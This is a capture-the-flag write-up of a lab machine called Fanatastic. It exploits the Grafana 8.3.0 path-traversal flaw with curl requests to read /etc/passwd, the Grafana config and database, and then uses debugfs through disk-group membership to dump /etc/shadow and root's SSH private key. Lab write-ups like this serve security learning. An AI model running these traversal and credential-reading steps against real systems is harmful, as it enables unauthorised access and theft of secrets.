# CTF Writeup: Fanatastic

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.196.181
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-27 23:16 EST
Nmap scan report for 192.168.196.181
Host is up (0.031s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
3000/tcp open  http    Grafana http
|_http-trane-info: Problem with XML parsing of /evox/about
| http-robots.txt: 1 disallowed entry 
|_/
| http-title: Grafana
|_Requested resource was /login
9090/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-title: Prometheus Time Series Collection and Processing Server
|_Requested resource was /graph
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT      ADDRESS
1   41.08 ms 192.168.45.1
2   41.07 ms 192.168.45.254
3   41.16 ms 192.168.251.1
4   41.28 ms 192.168.196.181

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.64 seconds
```

Let's start by observing the webpage running on port 3000.

It seems to be running grafana and provides us with an login panel.

I decided to enumerate endpoints before proceeding to enumerate manully.

```
dirsearch -u http://192.168.130.181:3000 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                              
 (_||| _) (/_(_|| (_| )                                                                                                                       
                                                                                                                                              
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/reports/http_192.168.130.181_3000/_25-12-27_23-27-13.txt

Target: http://192.168.130.181:3000/

[23:27:13] Starting:                                                                                                                          
[23:27:25] 401 -   32B  - /api-docs                                         
[23:27:25] 401 -   32B  - /api/2/issue/createmeta                           
[23:27:25] 401 -   32B  - /api.py                                           
[23:27:25] 401 -   32B  - /api                                              
[23:27:25] 401 -   32B  - /api.log
[23:27:25] 401 -   32B  - /api-doc
[23:27:25] 401 -   32B  - /api/2/explore/
[23:27:25] 401 -   32B  - /api/_swagger_/
[23:27:25] 401 -   32B  - /api/__swagger__/
[23:27:25] 401 -   32B  - /api/                                             
[23:27:25] 401 -   32B  - /api.php
[23:27:25] 401 -   32B  - /api/api                                          
[23:27:25] 401 -   32B  - /api/apidocs
[23:27:25] 401 -   32B  - /api/api-docs
[23:27:25] 401 -   32B  - /api/apidocs/swagger.json
[23:27:25] 401 -   32B  - /api/application.wadl
[23:27:25] 401 -   32B  - /api/batch
[23:27:25] 401 -   32B  - /api/cask/graphql
[23:27:25] 401 -   32B  - /api/config
[23:27:25] 401 -   32B  - /api/docs
[23:27:25] 401 -   32B  - /api/error_log
[23:27:25] 401 -   32B  - /api/docs/
[23:27:25] 401 -   32B  - /api/index.html
[23:27:25] 401 -   32B  - /api/login.json
[23:27:25] 401 -   32B  - /api/jsonws
[23:27:25] 401 -   32B  - /api/proxy
[23:27:25] 401 -   32B  - /api/swagger.json
[23:27:25] 401 -   32B  - /api/spec/swagger.json
[23:27:25] 401 -   32B  - /api/snapshots
[23:27:25] 401 -   32B  - /api/package_search/v4/documentation
[23:27:25] 401 -   32B  - /api/swagger.yaml
[23:27:25] 401 -   32B  - /api/jsonws/invoke
[23:27:25] 401 -   32B  - /api/swagger.yml
[23:27:25] 401 -   32B  - /api/swagger
[23:27:25] 401 -   32B  - /api/profile
[23:27:25] 401 -   32B  - /api/swagger-ui.html
[23:27:25] 401 -   32B  - /api/swagger/index.html
[23:27:25] 401 -   32B  - /api/swagger/swagger
[23:27:25] 401 -   32B  - /api/swagger/static/index.html
[23:27:25] 401 -   32B  - /api/swagger/ui/index
[23:27:25] 401 -   32B  - /api/timelion/run
[23:27:25] 401 -   32B  - /api/v1
[23:27:25] 401 -   32B  - /api/v1/swagger.json
[23:27:25] 401 -   32B  - /api/v1/
[23:27:25] 401 -   32B  - /api/v2
[23:27:25] 401 -   32B  - /api/v2/
[23:27:25] 401 -   32B  - /api/v1/swagger.yaml
[23:27:25] 401 -   32B  - /api/v2/helpdesk/discover
[23:27:25] 401 -   32B  - /api/v2/swagger.json
[23:27:25] 401 -   32B  - /api/v2/swagger.yaml
[23:27:25] 401 -   32B  - /api/v3
[23:27:25] 401 -   32B  - /api/v4
[23:27:25] 401 -   32B  - /api/vendor/phpunit/phpunit/phpunit
[23:27:25] 401 -   32B  - /api/version
[23:27:25] 401 -   32B  - /apidoc
[23:27:25] 401 -   32B  - /apibuild.pyc
[23:27:25] 401 -   32B  - /api/whoami
[23:27:25] 401 -   32B  - /apis
[23:27:25] 401 -   32B  - /apiserver-aggregator-ca.cert
[23:27:25] 401 -   32B  - /apidocs
[23:27:25] 401 -   32B  - /apiserver-aggregator.cert
[23:27:25] 401 -   32B  - /apiserver-aggregator.key
[23:27:25] 401 -   32B  - /apiserver-key.pem
[23:27:25] 401 -   32B  - /apiserver-client.crt
[23:27:34] 200 -    2B  - /healthz                                          
[23:27:38] 404 -    1KB - /login/administrator/                             
[23:27:38] 404 -    1KB - /login/cpanel.php                                 
[23:27:38] 404 -    1KB - /login/admin/
[23:27:38] 200 -   27KB - /login                                            
[23:27:38] 404 -    1KB - /login/index
[23:27:38] 404 -    1KB - /login/oauth/
[23:27:38] 404 -    1KB - /login/super
[23:27:38] 404 -    1KB - /login/cpanel/
[23:27:38] 404 -    1KB - /login/cpanel.html
[23:27:38] 404 -    1KB - /login/cpanel.jsp
[23:27:38] 404 -    1KB - /login/cpanel.js
[23:27:38] 404 -    1KB - /login/login
[23:27:38] 404 -    1KB - /login/cpanel.aspx                                
[23:27:38] 200 -   27KB - /login/                                           
[23:27:39] 200 -   56KB - /metrics                                          
[23:27:44] 302 -   31B  - /public  ->  /public/                             
[23:27:45] 200 -   26B  - /robots.txt                                       
[23:27:47] 200 -   27KB - /signup                                           
                                                                             
Task Completed 
```

No interesting endpoint retrieved, when pressing "Forgot password"? We get forwarded to another endpoint, which also provided us with grafana version information Grafana v8.3.0.

## Vulnerability Assessment

Let's search up CVE's.

```
searchsploit Grafana 
------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                              |  Path
------------------------------------------------------------------------------------------------------------ ---------------------------------
Grafana 7.0.1 - Denial of Service (PoC)                                                                     | linux/dos/48638.sh
Grafana 8.3.0 - Directory Traversal and Arbitrary File Read                                                 | multiple/webapps/50581.py
Grafana <=6.2.4 - HTML Injection                                                                            | typescript/webapps/51073.txt
------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
                      
```

We found an Directory Traversal Vulnerability, let's download the exploit locally and exploit it.

The Exploit itself, didn't work. But I analyzed which directory was set in there, /public/plugin/<name of the plugin> endpoint. Which is interesting, because it is inside our dirsearch scan aswell. 

Upon sending an request with the first plugin out of the list from the exploit, I was able to exploit the path traversal vuln and view the users on the target system.

```
curl --path-as-is "http://192.168.130.181:3000/public/plugins/alertlist/../../../../../../../../etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
grafana:x:113:117::/usr/share/grafana:/bin/false
prometheus:x:1000:1000::/home/prometheus:/bin/false
sysadmin:x:1001:1001::/home/sysadmin:/bin/sh
```

Let's search up where we can find the grafana configuration file.

```
/etc/grafana/grafana.ini
```

Upon inspecting the configuration file we get admin:admin

```
curl --path-as-is "http://192.168.130.181:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini"
# default admin user, created on startup
;admin_user = admin

# default admin password, can be changed before first start of grafana,  or in profile settings
;admin_password = admin

# used for signing
;secret_key = SW2YcwTIb9zpOOhoPsMm
```

Since we got the secret_key for the admin user, we can potentially decode the password, if we find it in the stored database, let's check if we can view it.

```
curl --path-as-is "http://192.168.130.181:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db" -o grafana.db
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  748k  100  748k    0     0  1364k      0 --:--:-- --:--:-- --:--:-- 1362k
```

Yes we can, we have it on our local machine now inside the grafana.db file.

Let's access it.

```
sqlite3 grafana.db "SELECT * FROM user;"
1|0|admin|admin@localhost||63f576276a6db59bb750c34f126945c1e941f9e3b21ab2f5be74ae00cc8abfc1b9f7ee5840f9abdae46efc0ee5350bd65aa8|0Vq2cDMrPt|zt192oddkH||1|1|0||2022-02-04 09:18:01|2022-02-04 09:19:59|0|2022-02-04 09:19:59|0|0
```

I wanted to manually enumerate the database.

```
file grafana.db
grafana.db: SQLite 3.x database, last written using SQLite version 3035004, file counter 401, database pages 187, cookie 0x138, schema 4, UTF-8, version-valid-for 401
```

We identified that it's an SQLite 3 Database, we navigated to the top-left of kali linux and selected "sqlitebrowser" > Selected our .db file > Enumerated all Tables and found an interesting table called "data-source" > column "basic_auth" > Pressed Browse Data > Retrieved Credentials. 

```
sysadmin:anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w== 
```

We discovered previously when inspecting the /etc/passwd file, that the user "sysadmin" is part of the users on the target server, so I'm assuming if we are able to crack this grafana password that we can login in via ssh.

Searched up for grafana password decrypters and utilized the following

```
git clone https://github.com/Sic4rio/Grafana-Decryptor-for-CVE-2021-43798.git
```

The decrypter comes with requirements, which we will have to download. In order to do so, we will have to create an virtual environment.

```
python3 venv myenv
source myenv/bin/activate
```

Download requirements.

```
pip install -r requirements.txt
Downloading questionary-2.1.1-py3-none-any.whl.metadata (5.4 kB)
Collecting requests (from -r requirements.txt (line 2))
  Using cached requests-2.32.5-py3-none-any.whl.metadata (4.9 kB)
Collecting cryptograpy (from -r requirements.txt (line 3))
  Downloading cryptograpy-0.0.0-py2.py3-none-any.whl.metadata (290 bytes)
Collecting termcolor (from -r requirements.txt (line 4))
  Downloading termcolor-3.2.0-py3-none-any.whl.metadata (6.4 kB)
Collecting prompt_toolkit<4.0,>=2.0 (from questionary->-r requirements.txt (line 1))
  Downloading prompt_toolkit-3.0.52-py3-none-any.whl.metadata (6.4 kB)
Collecting wcwidth (from prompt_toolkit<4.0,>=2.0->questionary->-r requirements.txt (line 1))
  Downloading wcwidth-0.2.14-py2.py3-none-any.whl.metadata (15 kB)
Collecting charset_normalizer<4,>=2 (from requests->-r requirements.txt (line 2))
  Using cached charset_normalizer-3.4.4-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl.metadata (37 kB)
Collecting idna<4,>=2.5 (from requests->-r requirements.txt (line 2))
  Using cached idna-3.11-py3-none-any.whl.metadata (8.4 kB)
Collecting urllib3<3,>=1.21.1 (from requests->-r requirements.txt (line 2))
  Using cached urllib3-2.6.2-py3-none-any.whl.metadata (6.6 kB)
Collecting certifi>=2017.4.17 (from requests->-r requirements.txt (line 2))
  Using cached certifi-2025.11.12-py3-none-any.whl.metadata (2.5 kB)
Collecting cryptography (from cryptograpy->-r requirements.txt (line 3))
  Using cached cryptography-46.0.3-cp311-abi3-manylinux_2_34_x86_64.whl.metadata (5.7 kB)
Collecting cffi>=2.0.0 (from cryptography->cryptograpy->-r requirements.txt (line 3))
  Using cached cffi-2.0.0-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.whl.metadata (2.6 kB)
Collecting pycparser (from cffi>=2.0.0->cryptography->cryptograpy->-r requirements.txt (line 3))
  Using cached pycparser-2.23-py3-none-any.whl.metadata (993 bytes)
Downloading questionary-2.1.1-py3-none-any.whl (36 kB)
Downloading prompt_toolkit-3.0.52-py3-none-any.whl (391 kB)
Using cached requests-2.32.5-py3-none-any.whl (64 kB)
Using cached charset_normalizer-3.4.4-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl (153 kB)
Using cached idna-3.11-py3-none-any.whl (71 kB)
Using cached urllib3-2.6.2-py3-none-any.whl (131 kB)
Downloading cryptograpy-0.0.0-py2.py3-none-any.whl (1.9 kB)
Downloading termcolor-3.2.0-py3-none-any.whl (7.7 kB)
Using cached certifi-2025.11.12-py3-none-any.whl (159 kB)
Using cached cryptography-46.0.3-cp311-abi3-manylinux_2_34_x86_64.whl (4.5 MB)
Using cached cffi-2.0.0-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.whl (219 kB)
Using cached pycparser-2.23-py3-none-any.whl (118 kB)
Downloading wcwidth-0.2.14-py2.py3-none-any.whl (37 kB)
Installing collected packages: wcwidth, urllib3, termcolor, pycparser, idna, charset_normalizer, certifi, requests, prompt_toolkit, cffi, questionary, cryptography, cryptograpy
Successfully installed certifi-2025.11.12 cffi-2.0.0 charset_normalizer-3.4.4 cryptography-46.0.3 cryptograpy-0.0.0 idna-3.11 prompt_toolkit-3.0.52 pycparser-2.23 questionary-2.1.1 requests-2.32.5 termcolor-3.2.0 urllib3-2.6.2 wcwidth-0.2.14
```

Changed the secret key within the exploit the one I discovered in /etc/grafana/grafana.ini "SW2YcwTIb9zpOOhoPsMm".

Ran the exploit & cracked the password.

```
python3 decrypt.py                                           

    ######################################                                                                                                    
             GRAFANA DECRYPTOR                                                                                                                
 CVE-2021-43798 Grafana Unauthorized                                                                                                          
  arbitrary file reading vulnerability                                                                                                        
                SICARI0                                                                                                                       
    ######################################                                                                                                    
                                                                                                                                              
? Enter the datasource password: anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w==
[*] grafanaIni_secretKey= SW2YcwTIb9zpOOhoPsMm
[*] DataSourcePassword= anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w==
[*] plainText= SuperSecureP@ssw0rd
```

Let's login via ssh sysadmin:SuperSecureP@ssw0rd

```
ssh sysadmin@192.168.130.181
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
sysadmin@192.168.130.181's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-97-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 28 Dec 2025 06:18:35 AM UTC

  System load:  0.08              Processes:               208
  Usage of /:   61.4% of 9.78GB   Users logged in:         0
  Memory usage: 32%               IPv4 address for ens160: 192.168.130.181
  Swap usage:   0%


0 updates can be applied immediately.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

$
```

Retrieved local.txt in /home/sysadmin directory.

```
c185bd0fc7f9c553becfd6619b5c9ed2
```

## Privilege Escalation

Performed Shell Hardening.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
stty raw -echo ; reset
stty columns 200 rows 200
export TERM=xterm
```

We identified that sysadmin is part of the disk group.

```
sysadmin@fanatastic:/$ id
uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin),6(disk)
```

Which means we could potentially write on system level filesystems and execute system commands on it to leverage root shell.

Unfortuantely /dev/mapper/ubuntu--vg-ubuntu--lv isn't available on the server.

```
sysadmin@fanatastic:/$ debugfs -w /dev/mapper/ubuntu--vg-ubuntu--lv
debugfs 1.45.5 (07-Jan-2020)
debugfs: No such file or directory while trying to open /dev/mapper/ubuntu--vg-ubuntu--lv
debugfs:
```

Enumerated root filesystem --> /dev/sda2.

```
sysadmin@fanatastic:~$ df -h
Filesystem      Size  Used Avail Use% Mounted on
udev            445M     0  445M   0% /dev
tmpfs            98M  1.2M   97M   2% /run
/dev/sda2       9.8G  6.1G  3.3G  65% /
tmpfs           489M     0  489M   0% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           489M     0  489M   0% /sys/fs/cgroup
/dev/loop0       62M   62M     0 100% /snap/core20/1328
/dev/loop1       33M   33M     0 100% /snap/snapd/12883
/dev/loop3       56M   56M     0 100% /snap/core18/2128
/dev/loop6       71M   71M     0 100% /snap/lxd/21029
/dev/loop4       68M   68M     0 100% /snap/lxd/21835
/dev/loop2       44M   44M     0 100% /snap/snapd/14549
/dev/loop5       56M   56M     0 100% /snap/core18/2284
tmpfs            98M     0   98M   0% /run/user/1001
```

Let's utilize debugfs in order to perform commands through the root filesystem.

```
sysadmin@fanatastic:~$ debugfs /dev/sda2
debugfs 1.45.5 (07-Jan-2020)
debugfs:  cat /etc/shadow
root:$6$mAe2JsSJSmg1n45O$78rgk3B6HaklRIPcLOtwP9aX5i.0aPF16NVm39i1cz3K7StTajlI2LFBp.WSxiAAyoB4SQd5qc123HVmH0HXJ/:19052:0:99999:7:::
daemon:*:18474:0:99999:7:::
bin:*:18474:0:99999:7:::
sys:*:18474:0:99999:7:::
sync:*:18474:0:99999:7:::
games:*:18474:0:99999:7:::
man:*:18474:0:99999:7:::
lp:*:18474:0:99999:7:::
mail:*:18474:0:99999:7:::
news:*:18474:0:99999:7:::
uucp:*:18474:0:99999:7:::
proxy:*:18474:0:99999:7:::
www-data:*:18474:0:99999:7:::
backup:*:18474:0:99999:7:::
list:*:18474:0:99999:7:::
irc:*:18474:0:99999:7:::
gnats:*:18474:0:99999:7:::
nobody:*:18474:0:99999:7:::
systemd-network:*:18474:0:99999:7:::
systemd-resolve:*:18474:0:99999:7:::
systemd-timesync:*:18474:0:99999:7:::
messagebus:*:18474:0:99999:7:::
syslog:*:18474:0:99999:7:::
_apt:*:18474:0:99999:7:::
tss:*:18474:0:99999:7:::
uuidd:*:18474:0:99999:7:::
tcpdump:*:18474:0:99999:7:::
landscape:*:18474:0:99999:7:::
pollinate:*:18474:0:99999:7:::
sshd:*:18634:0:99999:7:::
systemd-coredump:!!:18634::::::
lxd:!:18634::::::
usbmux:*:18864:0:99999:7:::
grafana:*:19027:0:99999:7:::
prometheus:!:19027:0:99999:7:::
sysadmin:$6$dpIlzNJI20lx.1rY$42EDl48wSZPsE0rcdqwraFS9ZXCPPLzS4wW4CbJqV4hBuuDWya39YSK0CGIYzaJIWg.vtEQn7615Dqs30eb4/0:19027:0:99999:7:::
```

Displayed /etc/shadow file and gained encoded password of user "root".

```
sysadmin@fanatastic:~$ debugfs /dev/sda2
debugfs 1.45.5 (07-Jan-2020)
debugfs:  cat /etc/shadow
root:$6$mAe2JsSJSmg1n45O$78rgk3B6HaklRIPcLOtwP9aX5i.0aPF16NVm39i1cz3K7StTajlI2LFBp.WSxiAAyoB4SQd5qc123HVmH0HXJ/:19052:0:99999:7:::
daemon:*:18474:0:99999:7:::
bin:*:18474:0:99999:7:::
sys:*:18474:0:99999:7:::
sync:*:18474:0:99999:7:::
games:*:18474:0:99999:7:::
man:*:18474:0:99999:7:::
lp:*:18474:0:99999:7:::
mail:*:18474:0:99999:7:::
news:*:18474:0:99999:7:::
uucp:*:18474:0:99999:7:::
proxy:*:18474:0:99999:7:::
www-data:*:18474:0:99999:7:::
backup:*:18474:0:99999:7:::
list:*:18474:0:99999:7:::
irc:*:18474:0:99999:7:::
gnats:*:18474:0:99999:7:::
nobody:*:18474:0:99999:7:::
systemd-network:*:18474:0:99999:7:::
systemd-resolve:*:18474:0:99999:7:::
systemd-timesync:*:18474:0:99999:7:::
messagebus:*:18474:0:99999:7:::
syslog:*:18474:0:99999:7:::
_apt:*:18474:0:99999:7:::
tss:*:18474:0:99999:7:::
uuidd:*:18474:0:99999:7:::
tcpdump:*:18474:0:99999:7:::
landscape:*:18474:0:99999:7:::
pollinate:*:18474:0:99999:7:::
sshd:*:18634:0:99999:7:::
systemd-coredump:!!:18634::::::
lxd:!:18634::::::
usbmux:*:18864:0:99999:7:::
grafana:*:19027:0:99999:7:::
prometheus:!:19027:0:99999:7:::
sysadmin:$6$dpIlzNJI20lx.1rY$42EDl48wSZPsE0rcdqwraFS9ZXCPPLzS4wW4CbJqV4hBuuDWya39YSK0CGIYzaJIWg.vtEQn7615Dqs30eb4/0:19027:0:99999:7:::
```

Displayed ssh private key of user "root".

```
debugfs:  cat /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAz1L/rbeJcJOc5T4Lppdp0oVnX0MgpfaBjW25My3ffAeJTeJwM1/R
YGtnByjnBAisdAsqctvGjZL6TewN4QNM0ew5qD2BQUU38bvq1lRdvbaD1m+WZkhp6DJrbi
42MKCUeTMY5AEPBPe4kHBN294BiUycmtLzQz5gJ99AUSQa59m6QJso4YlC7OCs7xkDAxSJ
pE56z1yaiY+y4l2akIxbAz7TVmJgRnhjJ4ZRuV2TYuSolJiSNeUyIUTozfRKl56Zs8f/QA
4Pd9AvSLZPN+s/INAULdxzgV3X9xHYh2NfRe8hw1Ju9OeJZ9lqQNBtFrit0ekpk75CJ2Z6
AMDV5tNlEcixwf/nMhjQb7Q/Oh4p7ievBk47f5t2dKlTsWw4iq1AX3FVA65n2TfD6cNISj
mxfQvXzMTPrs8KO7pHzMVQZZukOIwOEKwuZfNxIg4riGQvy4Cs+3c4w022UJ8oH36itgjr
pa4Ce+uRomYgRthDLaTNmk52TbZl0pg8AdDXB0SbAAAFgCd1RWkndUVpAAAAB3NzaC1yc2
EAAAGBAM9S/623iXCTnOU+C6aXadKFZ19DIKX2gY1tuTMt33wHiU3icDNf0WBrZwco5wQI
rHQLKnLbxo2S+k3sDeEDTNHsOag9gUFFN/G76tZUXb22g9ZvlmZIaegya24uNjCglHkzGO
QBDwT3uJBwTdveAYlMnJrS80M+YCffQFEkGufZukCbKOGJQuzgrO8ZAwMUiaROes9cmomP
suJdmpCMWwM+01ZiYEZ4YyeGUbldk2LkqJSYkjXlMiFE6M30SpeembPH/0AOD3fQL0i2Tz
frPyDQFC3cc4Fd1/cR2IdjX0XvIcNSbvTniWfZakDQbRa4rdHpKZO+QidmegDA1ebTZRHI
scH/5zIY0G+0PzoeKe4nrwZOO3+bdnSpU7FsOIqtQF9xVQOuZ9k3w+nDSEo5sX0L18zEz6
7PCju6R8zFUGWbpDiMDhCsLmXzcSIOK4hkL8uArPt3OMNNtlCfKB9+orYI66WuAnvrkaJm
IEbYQy2kzZpOdk22ZdKYPAHQ1wdEmwAAAAMBAAEAAAGAdNLfEcNHJfF3ylFQ/Vl6ns7fNf
W8cuhZjhkS77zcnqYcf4+mC7zlXYCHuKgarNI6YtVb4QbodiQo+TmXhIB4jB2hS6UErYPU
h1mNdaJqhBlRZsbQJ+iMDPRERvyxOmtx3m2li+zwyqrQDEvMA6Wwle5enHtb6js+sZkCQ/
alVpoAcqE7wwK2fIYJzFz6roSnHre+ShRzXCpl8VovW15LdqOzMI0UlQEHVmFAscQB5grU
1461bLsuqUKMMGmEkrUiAAQ3UujH2bovUZI02kOyoyijozwZXdQz1nM+LltrgFR1diOmdu
fYr23bjGRTi65Dx4Lw2a/KMiXeYvWb0u7kJ2rlEs01Vbvd2egx/TtZtqkEkWOhahO6oiAl
iwSc3734fdj6N7hcNcIj0KLqJoAdJfDtTwfdR2j8SbmtslztVEBtOU96KKUYT+XPbzaJjX
zzzA0m5TSq3mOvkm7zC6jNCnGQ2CznJTep2MlhAjIhGVbFT5Qh9pv4nr45xphqabbZAAAA
wFQQjZbLtbUxH4IuIeMqyWOmbRVoU9YC5NdWGF8ep2Ma4BEB7bBJw+g9SsT3z/rumzQeo3
2Eigs3NRsqULsQqr/Ts80AzjPuG11WU4p/5D+8dQhTyoseMPeg9JwveiZLZRJnlER3Bi2M
zv9mWw8ByNcWY0tyNTrQj5pUTLhhukMqRonMYV/qsAZVZs8VGvWT90NEVs9VL5bP22QDGO
mhkLPbQpBsrUBGBn53euvpw0DvnPI9YUrvzaQZjVDQU3uIcgAAAMEA/0jDXV/NDkTzvdlp
ZMgBvIPJAdWpiEj0GzsaBMlj5dDNTarsr1j82lYIXmG8S+T8E/iSRe0cvasxOM3tseIBVq
EFdhim3jh/mMKX1DfBMDShM5Q7xZr4eczl6xyJ1Qs4Nu3RHszWeeiqYXJeHjbpySnZ/Wec
atyS247gMCb2jYMXX8khnkHj1BWp1bHTpQuI/3oxrVSZVXbfUmfbJbsMtXlVgM3+5yqeny
29f1ZFlpb1NyhFe4U3plbXjLLwwY+PAAAAwQDP58+hi3mm0UoPaQXSFIQ2XPsc1TnxVZkF
WTKAu4jtHPrF9p19nZS3j3AJ0ndr0niWW9gGmQtjz56m06TtBCQAQw8P3ITt5uBkxRuwpd
fC7bp88+tDwg47yGdnHe4/bsX90J8x+/WVa2LbK/7Fh64djpoeN4WAHfKB/fmXGJ+kt0mu
qDz911lrLT9H8CrpYXlrKy5jxhO8yxqU1CqmZe8H8ILFMPyuw8UuOCF7EnhLR2ReAmOS2l
T3skewpHe8tDUAAAALcm9vdEB1YnVudHU=
-----END OPENSSH PRIVATE KEY-----
```

Saved the ssh key locally in id_rsa.

Gave it the lowest perms, so we are able to ssh into root.

```
chmod 600 id_rsa
```

Logged into user "root" via ssh.


```
ssh -i id_rsa root@192.168.130.181
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-97-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 28 Dec 2025 06:44:44 AM UTC

  System load:  0.05              Processes:               222
  Usage of /:   61.4% of 9.78GB   Users logged in:         1
  Memory usage: 34%               IPv4 address for ens160: 192.168.130.181
  Swap usage:   0%


0 updates can be applied immediately.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Tue Mar  1 18:46:45 2022
root@fanatastic:~#
```

Retrieved proof.txt in /root directory.

```
a0c0b16af375933563faedeb483bed23
```
